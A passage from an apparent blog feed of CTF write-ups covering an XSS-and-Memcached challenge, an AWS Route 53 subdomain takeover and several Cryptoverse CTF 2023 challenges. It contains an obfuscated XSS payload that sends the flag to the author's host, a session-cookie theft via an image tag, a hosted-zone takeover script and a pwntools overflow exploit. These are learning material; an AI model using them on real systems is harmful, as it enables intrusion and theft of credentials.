{"msg":"whatever","img":"a id=deny onerror=eval(String.fromCharCode(102,101,116,99,104,40,34,47,34,41,46,116,104,101,110,40,120,61,62,120,46,116,101,120,116,40,41,41,46,116,104,101,110,40,120,61,62,120,46,115,112,108,105,116,40,34,60,47,104,51,62,34,41,91,49,93,46,116,114,105,109,40,41,41,46,116,104,101,110,40,120,61,62,102,101,116,99,104,40,34,104,116,116,112,58,47,47,120,46,99,106,120,111,108,46,99,111,109,47,34,43,120,41,41))"}
</code></pre></div></div>

<p>The payload is repeated twice as the injection sometimes does not work as expected. The image tag sets ID to <code class="highlighter-rouge">deny</code> as the bot will click on the deny button which can cause a navigation before the script is executed. With image ID set as <code class="highlighter-rouge">deny</code>, the bot will not click on the deny button and click the image instead which does not cause a navigation.</p>

<p>In the <code class="highlighter-rouge">get-template</code> page, import template from the URL pointing to the TLS server. After a while, the web server will make request to Memcached and the payload will be stored in Memcached.</p>

<p>When querying Memcached directly, we can see the payload is stored in Memcached.</p>

<p><img src="/assets/image/m0lecon-teaser-2023-writeup/memcached.png" alt="Payload is in Memcached" /></p>

<p>When requested to review the requests, the bot will visit the page and execute the script. The flag is exfiltrated.</p>

<p><img src="/assets/image/m0lecon-teaser-2023-writeup/flag.png" alt="Flag is exfiltrated" /></p>

<p>The image is showing the fake flag for testing, and the real flag is:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ptm{why_an0ther_ch4ll_w1th_4_b0t??}
</code></pre></div></div>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><category term="ctf web" /><summary type="html"><![CDATA[m0leCon Teaser 2023 On CTFtime]]></summary></entry><entry><title type="html">Punk Security DevSecOps Birthday CTF Subdomain Takeover (Hard) Challenge Writeup</title><link href="https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/" rel="alternate" type="text/html" title="Punk Security DevSecOps Birthday CTF Subdomain Takeover (Hard) Challenge Writeup" /><published>2023-05-15T00:00:00+01:00</published><updated>2023-05-15T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/"><![CDATA[<p><a href="https://punksecurity.co.uk/ctf/2023/">Punk Security DevSecOps Birthday CTF</a><br />
<a href="https://ctftime.org/event/1903">On CTFtime</a></p>

<p>We did the 12-hour CTF on 4th May 2023. The CTF is unique and primarily focused on DevSecOps, including CI/CD pipelines, cloud etc. It is not in my best expertises, but we had a strong team and managed to full clear all the challenges and won the CTF.</p>

<p>We were one of the only teams solved this subdomain takeover challenge. This solve involves exploiting a dangling delegation DNS record on AWS Route 53 to takeover a subdomain, thus bypass some CSP restrictions.</p>

<h2 id="the-challenge-and-solve">The Challenge and Solve</h2>

<p><em>The notes and screenshots were taken when different challenge instances were running, so several different challenge domains may be in the writeup below.</em></p>

<h3 id="finding-the-dangling-delegation">Finding the Dangling Delegation</h3>

<p>In the challenge description, it suggested to do a scan of possible subdomain takeover with <a href="https://github.com/punk-security/dnsReaper">dnsReaper</a> tool made and open sourced by Punk Security.</p>

<p>After the scan, we found a dangling delegation DNS record for zone <code class="highlighter-rouge">dev.[challenge domain]</code>, as shown in the screenshot below.</p>

<p><img src="/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/dnsReaper.png" alt="dnsReaper scan result" /></p>

<p>I then created hosted zone on AWS Route 53 for <code class="highlighter-rouge">dev.[challenge domain]</code> and AWS will randomly assign 4 nameservers for the hosted zone. I used the following script to repeatedly create hosted zone and check the nameservers until I got at least one of the nameservers that the zone is delegated to.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">boto3</span>
<span class="kn">import</span> <span class="nn">uuid</span>
<span class="n">client</span> <span class="o">=</span> <span class="n">boto3</span><span class="p">.</span><span class="n">client</span><span class="p">(</span><span class="s">'route53'</span><span class="p">)</span>
<span class="n">target_nameservers</span> <span class="o">=</span> <span class="s">'ns-423.awsdns-52.com,ns-904.awsdns-49.net,ns-1899.awsdns-45.co.uk,ns-1125.awsdns-12.org'</span>
<span class="n">target_nameservers</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">target_nameservers</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">','</span><span class="p">))</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">print</span><span class="p">(</span><span class="n">count</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">'</span><span class="se">\r</span><span class="s">'</span><span class="p">)</span>
    <span class="n">zone</span> <span class="o">=</span> <span class="n">client</span><span class="p">.</span><span class="n">create_hosted_zone</span><span class="p">(</span>
        <span class="n">Name</span><span class="o">=</span><span class="s">'dev.d9edd91f-c40.ctf.two.dr.punksecurity.cloud'</span><span class="p">,</span>
        <span class="n">CallerReference</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="n">uuid4</span><span class="p">()),</span>
        <span class="n">HostedZoneConfig</span><span class="o">=</span><span class="p">{</span>
            <span class="s">'PrivateZone'</span><span class="p">:</span> <span class="bp">False</span>
        <span class="p">}</span>
    <span class="p">)</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">zone</span><span class="p">[</span><span class="s">'HostedZone'</span><span class="p">][</span><span class="s">'Id'</span><span class="p">]</span>
    <span class="n">nameservers</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">zone</span><span class="p">[</span><span class="s">'DelegationSet'</span><span class="p">][</span><span class="s">'NameServers'</span><span class="p">])</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">nameservers</span> <span class="o">&amp;</span> <span class="n">target_nameservers</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">break</span>
    <span class="n">client</span><span class="p">.</span><span class="n">delete_hosted_zone</span><span class="p">(</span><span class="n">Id</span><span class="o">=</span><span class="nb">id</span><span class="p">)</span>
</code></pre></div></div>

<p>It took only just over 100 attempts to get a nameserver that the zone is delegated to.</p>

<h3 id="finding-loopholes-on-the-web">Finding Loopholes on the Web</h3>

<p>The web app to be exploited uses CSP to restrict the loading of external scripts. It only allows the script from the same origin. However, the session cookie is set to the domain scope of <code class="highlighter-rouge">.[challenge domain]</code>, that means when making requests to any subdomains or even sub-subdomains etc, the session cookie will be included.</p>

<p><img src="/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/cookie.png" alt="Session Cookie" /></p>

<p>The CSP on the web app also allows images from any origin, so we can load images from the subdomain we took over.</p>

<p>With the <code class="highlighter-rouge">dev.[challenge domain]</code> zone we took over with our own AWS account, we can create a subdomain <code class="highlighter-rouge">takeover.dev.[challenge domain]</code> and point it to a web server we control.</p>

<p><img src="/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/route53.png" alt="Pointing the subdomain to our server on AWS Route 53" /></p>

<p>Thus, we I post a comment with the following content, the admin bot will make request to our server with the session cookie.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://takeover.dev.[challenge domain]"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p><img src="/assets/image/punk-security-devsecops-birthday-ctf-subdomain-takeover-hard-writeup/listen.png" alt="The admin bot made request to our server with session cookie" /></p>

<p>With the session cookie of the admin bot, we can now make request to the web app with the session cookie and get the flag.</p>

<h2 id="notes-and-findings-during-the-ctf">Notes and Findings during the CTF</h2>

<p>In the <code class="highlighter-rouge">results.csv</code> outputted by dnsReaper, I noticed the link to a <a href="https://github.com/punk-security/dnsReaper/issues/122">GitHub Issue</a> discussing about some protections on AWS Route 53 against domain takeover because of dangling delegation. In that discussion, there is a link to a <a href="https://youtu.be/GGfQlPZSRk4?t=712">video demo</a> of the subdomain take over on AWS Route 53 at BSides Newcastle by <a href="https://github.com/SimonGurney">SimonGurney</a> whom is the author of dnsReaper. Despite not the best recording audio quality, the demo was very helpful to understand this exploit.</p>

<p>Regarding <a href="https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/protection-from-dangling-dns.html">the protection from dangling delegation records in Route 53</a>, when the subdomain hosted zone is removed, the delegation will need to be removed and recreated to delegate the subdomain to a hosted zone. However, if a hosted zone is never created before the delegation, meaning the domain has always been dangling, the protection will not automatically protect against subdomain takeover.</p>]]></content><author><name></name></author><category term="ctf" /><category term="ctf writeup" /><summary type="html"><![CDATA[Punk Security DevSecOps Birthday CTF On CTFtime]]></summary></entry><entry><title type="html">Cryptoverse CTF 2023 Writeup</title><link href="https://www.cjxol.com/posts/cryptoverse-ctf-2023-writeup/" rel="alternate" type="text/html" title="Cryptoverse CTF 2023 Writeup" /><published>2023-05-09T00:00:00+01:00</published><updated>2023-05-09T00:00:00+01:00</updated><id>https://www.cjxol.com/posts/cryptoverse-ctf-2023-writeup</id><content type="html" xml:base="https://www.cjxol.com/posts/cryptoverse-ctf-2023-writeup/"><![CDATA[<p><em><a href="https://cryptoversectf.tk/">Cryptoverse CTF 2023</a></em><br />
<em><a href="https://ctftime.org/event/1907">On CTFtime</a></em></p>

<p>There are many challenges in this CTF which are great for learning yet still challenging and not trivial. Kudos to the organiser! Here are the writeups to some of the challenges my team solved.</p>

<p>On this page:</p>
<ul>
  <li><a href="#crypto-warmup-1">Crypto Warmup 1</a> - Simple cipher challenge</li>
  <li><a href="#crypto-warmup-2">Crypto Warmup 2</a> - Simple cipher challenge</li>
  <li><a href="#crypto-baby-aes">Crypto Baby AES</a> - Simple AES key brute force</li>
  <li><a href="#misc-minecrafts-deadly-dilemma">Misc Minecraft’s Deadly Dilemma</a></li>
  <li><a href="#reverse-simple-checkin">Reverse Simple Checkin</a> - Simple binary xor reversing</li>
  <li><a href="#reverse-micro-assembly">Reverse Micro Assembly</a> - Simple “hypothetical assembly language” reversing</li>
  <li><a href="#reverse-solid-reverse">Reverse Solid Reverse</a> - Solidity/smart contract reversing</li>
  <li><a href="#pwn-acceptance">Pwn Acceptance</a> - Buffer overflow to overwrite variable</li>
  <li><a href="#web-safe-locker">Web Safe Locker</a> - Client-side bruteforce</li>
  <li><a href="#hoyoverse-ii-prompt-bot">HoYoverse II: Prompt Bot</a> - ChatGPT prompt target output challenge</li>
  <li><a href="#hoyoverse-iii-secret-vault">HoYoverse III Secret Vault</a> - Crypto challenge solving linear equations</li>
</ul>

<h2 id="crypto-warmup-1">Crypto Warmup 1</h2>

<blockquote>
  <p>Decode the following ciphertext: GmvfHt8Kvq16282R6ej3o4A9Pp6MsN.</p>
</blockquote>

<p>This actually took my team a while to figure out, and this challenge got fewer solves compared to Crypto Warmup 2 below (175 and 233 solves respectively). Turns out to solve it need to do rot13 then base58 decode.</p>

<p>The flag is <code class="highlighter-rouge">cvctf{base58_with_rot}</code>.</p>

<h2 id="crypto-warmup-2">Crypto Warmup 2</h2>

<blockquote>
  <p>This cipher is invented by French cryptographer Felix Delastelle at the end of the 19th century.<br />
Ciphertext: SCCGDSNFTXCOJPETGMDNG Hint: CTFISGODABEHJKLMNPQRUVWXY</p>
</blockquote>

<p>When seeing random ciphers in CTF, I immediately think of <a href="https://www.dcode.fr/">dcode.fr</a>. After a quick Google search for “Felix Delastelle cipher”, the 3rd result was the link to <a href="https://www.dcode.fr/bifid-cipher">decode.fr</a>.</p>

<p><img src="/assets/image/cryptoverse-ctf-2023-writeup/crypto-warmup-2.png" alt="Bifid decoder" /></p>

<h2 id="crypto-baby-aes">Crypto Baby AES</h2>

<p>In this challenge the flag is encrypted with AES CBC mode, with IV and the encrypted flag provided in the output. The key is generated with the code below:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">KEY_LEN</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">BS</span> <span class="o">=</span> <span class="mi">16</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"/dev/urandom"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">(</span><span class="n">KEY_LEN</span><span class="p">),</span> <span class="n">BS</span><span class="p">)</span>
</code></pre></div></div>

<p>The unknown part of the key is only 2 bytes, so we can brute force it, and decrypt the flag.</p>

<h2 id="misc-minecrafts-deadly-dilemma">Misc Minecraft’s Deadly Dilemma</h2>

<p>The challenge provided two grayscale images “pickaxe.png” and “sword.png”, and the goal is to find a image with L1 distance to “pickaxe.png” close enough that is smaller than <script type="math/tex">474^2 = 224676</script>, but with L2 distance to “pickaxe.png” larger than to “sword.png”. The L2 distance between the provided two images is 10411.40 and the L1 distance is 442888.</p>

<p>To find such image, I tried two approaches:</p>

<ul>
  <li>
    <p>The first one is to start with “pickaxe.png”, so the L1 distance is 0, and then change the pixels value where “pickaxe.png” is smaller than “sword.png” to the maximum value, which would result in a larger increase in L2 distance for “pickaxe.png” than for “sword.png” until before the L1 distance reaches over 224676. However, as the L2 distance to “sword.png” is already quite large, the L1 distance would reach over 474 before the L2 distance to “pickaxe.png” is larger than to “sword.png”.</p>
  </li>
  <li>
    <p>The second approach is also to start with “pickaxe.png”, but instead of increasing the L2 distance for “pickaxe.png”, I reduce the L2 distance to “sword.png” while increasing the L2 distance to “pickaxe.png” until the L2 distance to “pickaxe.png” is larger than to “sword.png” while the L1 distance is still smaller than 224676. The code is shown below:</p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">xy</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
  <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
      <span class="n">p1</span> <span class="o">=</span> <span class="n">pick</span><span class="p">.</span><span class="n">getpixel</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">))</span>
      <span class="n">p2</span> <span class="o">=</span> <span class="n">sword</span><span class="p">.</span><span class="n">getpixel</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">))</span>
      <span class="n">xy</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">p1</span> <span class="o">-</span> <span class="n">p2</span><span class="p">,</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)))</span>
<span class="n">xy</span><span class="p">.</span><span class="n">sort</span><span class="p">()</span> <span class="c1"># large negative first
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3500</span><span class="p">):</span>
  <span class="n">p</span><span class="p">,</span> <span class="n">c</span> <span class="o">=</span> <span class="n">xy</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
  <span class="n">pick</span><span class="p">.</span><span class="n">putpixel</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">sword</span><span class="p">.</span><span class="n">getpixel</span><span class="p">(</span><span class="n">c</span><span class="p">))</span>
<span class="n">pick</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="s">'out.png'</span><span class="p">)</span>
</code></pre></div>    </div>
  </li>
</ul>

<h2 id="reverse-simple-checkin">Reverse Simple Checkin</h2>

<p>Decompile the binary provided with the binary, realising the binary is to check if the input xor with some data is equal to some other data. Implemented the script in Python to xor the two data and get the very long flag:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cvctf{i_apologize_for_such_a_long_string_in_this_checkin_challenge,but_it_might_be_a_good_time_to_learn_about_automating_this_process?You_might_need_to_do_it_because_here_is_a_painful_hex:32a16b3a7eef8de1263812.Enjoy(or_not)!}
</code></pre></div></div>

<h2 id="reverse-micro-assembly">Reverse Micro Assembly</h2>

<p>In this challenge, an assembly file in AT&amp;T syntax is provided. After Googling around of the instructions (especially something special with the DIV instruction which takes 3 arguments and followed with instruction to compare value in register 12), I found out that the assembly is “hypothetical assembly language”, which is based on x86 assembly. The instructions reference can be found on <a href="http://www.ctoassembly.com/asm.html">http://www.ctoassembly.com/asm.html</a>.</p>

<p>As there are conditional jumps in the assembly, however they do not form any loops, I solved this challenge by hand and the resulting stack contains the flag.</p>

<h2 id="reverse-solid-reverse">Reverse Solid Reverse</h2>

<p>This challenge is to reverse a smart contract in Solidity. The contract is shown below:</p>

<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">contract</span> <span class="n">ReverseMe</span> <span class="p">{</span>
    <span class="kt">uint</span> <span class="n">goal</span> <span class="o">=</span> <span class="mh">0x57e4e375661c72654c31645f78455d19</span><span class="p">;</span>
    <span class="k">function</span> <span class="n">magic1</span><span class="p">(</span><span class="kt">uint</span> <span class="n">x</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">n</span><span class="p">)</span> <span class="k">public</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Something magic
</span>        <span class="kt">uint</span> <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">n</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="n">m</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">magic2</span><span class="p">(</span><span class="kt">uint</span> <span class="n">x</span><span class="p">)</span> <span class="k">public</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Something else magic
</span>        <span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">((</span><span class="n">x</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">i</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">checkflag</span><span class="p">(</span><span class="kt">bytes16</span> <span class="n">flag</span><span class="p">,</span> <span class="kt">bytes16</span> <span class="n">y</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">uint128</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">^</span> <span class="kt">uint128</span><span class="p">(</span><span class="n">y</span><span class="p">)</span> <span class="o">==</span> <span class="n">goal</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">modifier</span> <span class="n">checker</span><span class="p">(</span><span class="kt">bytes16</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">require</span><span class="p">(</span><span class="kt">bytes8</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x3492800100670155</span><span class="p">,</span> <span class="s">"Wrong key!"</span><span class="p">);</span>
        <span class="nb">require</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="kt">uint128</span><span class="p">(</span><span class="n">key</span><span class="p">))</span> <span class="o">==</span> <span class="kt">uint32</span><span class="p">(</span><span class="kt">uint128</span><span class="p">(</span><span class="n">key</span><span class="p">)),</span> <span class="s">"Wrong key!"</span><span class="p">);</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">magic1</span><span class="p">(</span><span class="kt">uint128</span><span class="p">(</span><span class="n">key</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x1964</span><span class="p">,</span> <span class="s">"Wrong key!"</span><span class="p">);</span>
        <span class="nb">require</span><span class="p">(</span><span class="n">magic2</span><span class="p">(</span><span class="kt">uint64</span><span class="p">(</span><span class="kt">uint128</span><span class="p">(</span><span class="n">key</span><span class="p">)))</span> <span class="o">==</span> <span class="mi">16</span><span class="p">,</span> <span class="s">"Wrong key!"</span><span class="p">);</span>
        <span class="n">_</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="n">unlock</span><span class="p">(</span><span class="kt">bytes16</span> <span class="n">key</span><span class="p">,</span> <span class="kt">bytes16</span> <span class="n">flag</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="n">checker</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Main function
</span>        <span class="nb">require</span><span class="p">(</span><span class="n">checkflag</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="n">key</span><span class="p">),</span> <span class="s">"Flag is wrong!"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="highlighter-rouge">unlock</code> function will check if the key is correct through the <code class="highlighter-rouge">checker</code> modifier. Then it will check that the <code class="highlighter-rouge">flag</code> xor with the <code class="highlighter-rouge">key</code> is equal to the <code class="highlighter-rouge">goal</code>. So we can get the flag by xor the <code class="highlighter-rouge">goal</code> with the <code class="highlighter-rouge">key</code>. The <code class="highlighter-rouge">key</code> is not provided, but we can get it by solving the <code class="highlighter-rouge">checker</code> modifier.</p>

<p>The <code class="highlighter-rouge">magic1</code> function is to get the lower 16 bits of the key, and the <code class="highlighter-rouge">magic2</code> function is to get the number of bits of the key.</p>

<ul>
  <li>The first line of the checker is to check if the first 8 bytes of the key is <code class="highlighter-rouge">0x3492800100670155</code>.</li>
  <li>The second line is to check that the lower 32 bits of the key is equal to the lower 64 bits of the key, which means the upper 32 bits in the lower 64 bits of the key is zero.</li>
  <li>The third line is to check that the lower 16 bits of the key is <code class="highlighter-rouge">0x1964</code>.</li>
  <li>The fourth line is to check that the number of bits of the lower 64 bit of the key is 16 + 1 = 17 excluding leading zeros. This resulting in the lower 64 bit of the key is between 0x10000 and 0x1ffff.</li>
</ul>

<p>The final key is <code class="highlighter-rouge">0x34928001006701550000000000011964</code>, and flag can be obtained by xor the key with the goal.</p>

<h2 id="pwn-acceptance">Pwn Acceptance</h2>

<p>The challenge provided a binary executable. Decompile the binary with IDA, the code snip for main function is shown below:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">say</span><span class="p">,</span> <span class="mh">0x24uLL</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">accept</span> <span class="p">)</span>
  <span class="n">print_flag</span><span class="p">();</span>
<span class="k">else</span>
  <span class="nf">puts</span><span class="p">(</span><span class="s">"Arg! Why don't you help me :(("</span><span class="p">);</span>
<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</code></pre></div></div>

<p>Looking into <code class="highlighter-rouge">&amp;say</code>, it points to some statically allocated variable (.bss) with size of 32 bytes, while the <code class="highlighter-rouge">read</code> would read up to 0x24 (36) bytes. The <code class="highlighter-rouge">accept</code> variable is 4 bytes and is located right after <code class="highlighter-rouge">&amp;say</code>. So we can overflow the <code class="highlighter-rouge">accept</code> variable and overwrite it with non-zero value to make <code class="highlighter-rouge">print_flag()</code> to be called.</p>

<p>Decompile the <code class="highlighter-rouge">print_flag()</code> function, there are two condition checks before the flag is actually printed. The first one is to check if the <code class="highlighter-rouge">accept</code> variable is smaller or equal to 0, the second one is to check if the <code class="highlighter-rouge">accept</code> variable is equal to -1.</p>

<p>To solve the challenge, I send 32 bytes of arbitrary data, followed by -1 encoded for 4 bytes, which is <code class="highlighter-rouge">\xff\xff\xff\xff</code>. The flag is printed out.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'example.com'</span><span class="p">,</span> <span class="mi">4000</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Help him: '</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\xFF\xFF\xFF\xFF</span><span class="s">'</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="web-safe-locker">Web Safe Locker</h2>

<p>The goal of the challenge is to find the passcode.</p>

<p><img src="/assets/image/cryptoverse-ctf-2023-writeup/web-safe-locker.png" alt="Safe locker page" /></p>

<p>The relevant code is within a JavaScript module on this page. The actual check appears to be done with web assembly. However, without reversing the web assembly, I can still bruteforce the passcode with the JavaScript code. There are only 10,000,000 possible passcodes, and it is possible to bruteforce, however the web page crashes if I try to bruteforce all the passcodes at once. So I bruteforce the passcode in batches, also this allows me to do them parallelly in different browser tabs.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span><span class="p">(</span><span class="dl">'</span><span class="s1">/passCheck.js</span><span class="dl">'</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">m</span> <span class="o">=&gt;</span> <span class="nx">m</span><span class="p">.</span><span class="k">default</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">m</span> <span class="o">=&gt;</span> <span class="nx">password_checker</span> <span class="o">=</span> <span class="nx">m</span><span class="p">.</span><span class="nx">cwrap</span><span class="p">(</span><span class="dl">'</span><span class="s1">checker</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">boolean</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">]))</span>
<span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="nx">p</span> <span class="k">of</span> <span class="nb">Array</span><span class="p">(</span><span class="mi">10000000</span><span class="p">).</span><span class="nx">keys</span><span class="p">())</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">s</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">00000000</span><span class="dl">'</span> <span class="o">+</span> <span class="p">(</span><span class="nx">p</span> <span class="o">+</span> <span class="mi">10000000</span><span class="p">);</span>
    <span class="nx">s</span> <span class="o">=</span> <span class="nx">s</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">s</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">password_checker</span><span class="p">(</span><span class="nx">s</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This is also another not bruteforcable version of this challenge in the CTF, which checks an extra string value. I have not tried to solve it yet.</p>

<h2 id="hoyoverse-ii-prompt-bot">HoYoverse II: Prompt Bot</h2>

<p>In this challenge, the goal is to send prompt (there is a character limit of the prompt length, so the prompt cannot be too long. Also the prompt cannot contain the exact target) that makes the ChatGPT bot to output the exact target response.</p>

<p>The targets are:</p>

<ul>
  <li><code class="highlighter-rouge">dlrow olleh</code></li>
  <li><code class="highlighter-rouge">zellic zelli zell zel ze z</code></li>
  <li>
    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*****
****
***
**
*
</code></pre></div>    </div>
  </li>
</ul>

<p>My prompts are:</p>

<ul>
  <li><code class="highlighter-rouge">reverse hello world</code></li>
  <li><code class="highlighter-rouge">zellic zelli zell zel ze Z to lower</code></li>
  <li><code class="highlighter-rouge">5 lines of *, with 5 to 1</code></li>
</ul>

<p>I got the 2nd prompt inspiration from my teammate’s screenshot, where the output he got with all <code class="highlighter-rouge">Z</code>s in upper case. So I tried to make the <code class="highlighter-rouge">Z</code> in lower case, and it worked.</p>

<p><img src="/assets/image/cryptoverse-ctf-2023-writeup/hoyoverse-2-prompt-bot.png" alt="Screenshot of the response my teammate got" /></p>

<h2 id="hoyoverse-iii-secret-vault">HoYoverse III: Secret Vault</h2>

<p>This challenge is with a provided Python file, the snip of the code is shown below:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">FLAG</span>
<span class="n">FLAG</span> <span class="o">=</span> <span class="n">FLAG</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="k">class</span> <span class="nc">HoYoVault</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">u</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="n">w</span><span class="p">):</span>
